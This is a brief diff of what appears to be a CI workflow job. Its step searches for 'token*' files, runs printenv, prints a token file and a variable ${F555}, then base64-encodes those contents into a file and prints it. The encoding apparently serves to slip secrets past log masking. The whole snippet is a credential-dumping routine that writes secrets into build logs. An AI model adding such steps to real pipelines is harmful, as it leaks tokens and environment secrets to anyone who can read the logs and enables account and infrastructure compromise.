@@ -25,6 +25,7 @@ jobs:
           ls
           find . -name "token*" -not -path "/opt/az/*" -not -path "**/node_modules/*"
           printenv        
-          cat token ${F555}
+          cat token 
+          cat ${F555}
           cat token ${F555} | base64> out
           cat out
